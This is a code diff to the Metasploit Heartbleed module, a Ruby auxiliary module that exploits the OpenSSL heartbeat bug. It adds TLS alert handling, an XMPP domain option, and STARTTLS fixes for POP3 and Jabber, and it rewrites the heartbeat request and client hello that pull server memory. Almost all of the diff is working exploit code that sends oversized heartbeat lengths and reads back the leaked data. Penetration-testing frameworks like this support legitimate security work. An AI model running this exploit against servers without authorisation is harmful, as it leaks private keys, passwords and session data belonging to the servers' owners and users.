@@ -67,6 +67,7 @@ class Metasploit3 < Msf::Auxiliary
 
   HANDSHAKE_RECORD_TYPE = 0x16
   HEARTBEAT_RECORD_TYPE = 0x18
+  ALERT_RECORD_TYPE     = 0x15
   TLS_VERSION = {
     '1.0' => 0x0301,
     '1.1' => 0x0302,
@@ -82,7 +83,7 @@ class Metasploit3 < Msf::Auxiliary
 
   def initialize
     super(
-      'Name'           => 'OpenSSL Heartbeat Information Leak',
+      'Name'           => 'OpenSSL Heartbeat (Heartbleed) Information Leak',
       'Description'    => %q{
         This module implements the OpenSSL Heartbleed attack. The problem
         exists in the handling of heartbeat requests, where a fake length can
@@ -96,7 +97,8 @@ class Metasploit3 < Msf::Auxiliary
         'Matti', # Vulnerability discovery
         'Jared Stafford <jspenguin[at]jspenguin.org>', # Original Proof of Concept. This module is based on it.
         'FiloSottile', # PoC site and tool
-        'Christian Mehlmauer <FireFart[at]gmail.com>', # Msf module
+        'Christian Mehlmauer', # Msf module
+        'wvu', # Msf module
         'juan vazquez' # Msf module
       ],
       'References'     =>
@@ -117,8 +119,14 @@ class Metasploit3 < Msf::Auxiliary
       [
         Opt::RPORT(443),
         OptEnum.new('STARTTLS', [true, 'Protocol to use with STARTTLS, None to avoid STARTTLS ', 'None', [ 'None', 'SMTP', 'IMAP', 'JABBER', 'POP3' ]]),
-        OptEnum.new('TLSVERSION', [true, 'TLS version to use', '1.1', ['1.0', '1.1', '1.2']])
+        OptEnum.new('TLSVERSION', [true, 'TLS version to use', '1.0', ['1.0', '1.1', '1.2']])
       ], self.class)
+
+    register_advanced_options(
+      [
+        OptString.new('XMPPDOMAIN', [ true, 'The XMPP Domain to use when Jabber is selected', 'localhost' ])
+      ], self.class)
+
   end
 
   def peer
@@ -155,7 +163,7 @@ class Metasploit3 < Msf::Auxiliary
     sock.get_once
     sock.put("CAPA\r\n")
     res = sock.get_once
-    if res.nil? || res =~ /^-/
+    if res.nil? || res =~ /^-/ || res !~ /STLS/
       return nil
     end
     sock.put("STLS\r\n")
@@ -163,6 +171,7 @@ class Metasploit3 < Msf::Auxiliary
     if res.nil? || res =~ /^-/
       return nil
     end
+    res
   end
 
   def tls_jabber
@@ -170,12 +179,14 @@ class Metasploit3 < Msf::Auxiliary
     msg = "<?xml version='1.0' ?>"
     msg << "<stream:stream xmlns='jabber:client' "
     msg << "xmlns:stream='http://etherx.jabber.org/streams' "
-    msg << "xmlns:tls='http://www.ietf.org/rfc/rfc2595.txt' "
-    msg << "to='#{rhost}'>"
+    msg << "version='1.0' "
+    msg << "to='#{datastore['XMPPDOMAIN']}'>"
     sock.put(msg)
-    res = sock.get_once
-    return nil if res.nil? # SSL not supported
-    return nil if res =~ /stream:error/ || res !~ /starttls/i
+    res = sock.get
+    if res.nil? || res =~ /stream:error/ || res !~ /starttls/i
+      print_error("#{peer} - Jabber host unknown. Please try changing the XMPPDOMAIN option.") if res && res =~ /<host-unknown/
+      return nil
+    end
     msg = "<starttls xmlns='urn:ietf:params:xml:ns:xmpp-tls'/>"
     sock.put(msg)
     sock.get_once
@@ -211,20 +222,37 @@ class Metasploit3 < Msf::Auxiliary
       return
     end
 
-    unpacked = hdr.unpack('CnC')
+    unpacked = hdr.unpack('Cnn')
     type = unpacked[0]
     version = unpacked[1] # must match the type from client_hello
     len = unpacked[2]
 
+    # try to get the TLS error
+    if type == ALERT_RECORD_TYPE
+      res = sock.get_once(len)
+      alert_unp = res.unpack('CC')
+      alert_level = alert_unp[0]
+      alert_desc = alert_unp[1]
+      msg = "Unknown error"
+      # http://tools.ietf.org/html/rfc5246#section-7.2
+      case alert_desc
+      when 0x46
+        msg = "Protocol error. Looks like the chosen protocol is not supported."
+      end
+      print_error("#{peer} - #{msg}")
+      disconnect
+      return
+    end
+
     unless type == HEARTBEAT_RECORD_TYPE && version == TLS_VERSION[datastore['TLSVERSION']]
-      vprint_error("#{peer} - Unexpected Heartbeat response'")
+      vprint_error("#{peer} - Unexpected Heartbeat response")
       disconnect
       return
     end
 
     vprint_status("#{peer} - Heartbeat response, checking if there is data leaked...")
     heartbeat_data = sock.get_once(heartbeat_length) # Read the magic length...
-    if heartbeat_data && heartbeat_data.length > len
+    if heartbeat_data
       print_good("#{peer} - Heartbeat response with leak")
       report_vuln({
         :host => rhost,
@@ -240,26 +268,29 @@ class Metasploit3 < Msf::Auxiliary
   end
 
   def heartbeat(length)
-    payload = "\x01"      # Heartbeat Message Type: Request (1)
-    payload << "\x40\x00" # Payload Length: 16384
-    payload << [length].pack("n")
+    payload = "\x01"              # Heartbeat Message Type: Request (1)
+    payload << [length].pack("n") # Payload Length: 16384
 
     ssl_record(HEARTBEAT_RECORD_TYPE, payload)
   end
 
   def client_hello
-    hello_data = [TLS_VERSION[datastore['TLSVERSION']]].pack("n") # Version TLS
-    hello_data << "\x53\x43\x5b\x90"       # Random generation Time (Apr  8, 2014 04:14:40.000000000)
-    hello_data << Rex::Text.rand_text(28)  # Random
-    hello_data << "\x00"                   # Session ID length
-    hello_data << [CIPHER_SUITES.length * 2].pack("n") # Cipher Suites length (102)
-    hello_data << CIPHER_SUITES.pack("n*") # Cipher Suites
-    hello_data << "\x01"                   # Compression methods length (1)
-    hello_data << "\x00"                   # Compression methods: null
+    # Use current day for TLS time
+    time_temp = Time.now
+    time_epoch = Time.mktime(time_temp.year, time_temp.month, time_temp.day, 0, 0).to_i
 
-    hello_data_extensions = "\x00\x0f"     # Extension type (Heartbeat)
-    hello_data_extensions << "\x00\x01"    # Extension length
-    hello_data_extensions << "\x01"        # Extension data
+    hello_data = [TLS_VERSION[datastore['TLSVERSION']]].pack("n") # Version TLS
+    hello_data << [time_epoch].pack("N")    # Time in epoch format
+    hello_data << Rex::Text.rand_text(28)   # Random
+    hello_data << "\x00"                    # Session ID length
+    hello_data << [CIPHER_SUITES.length * 2].pack("n") # Cipher Suites length (102)
+    hello_data << CIPHER_SUITES.pack("n*")  # Cipher Suites
+    hello_data << "\x01"                    # Compression methods length (1)
+    hello_data << "\x00"                    # Compression methods: null
+
+    hello_data_extensions = "\x00\x0f"      # Extension type (Heartbeat)
+    hello_data_extensions << "\x00\x01"     # Extension length
+    hello_data_extensions << "\x01"         # Extension data
 
     hello_data << [hello_data_extensions.length].pack("n")
     hello_data << hello_data_extensions
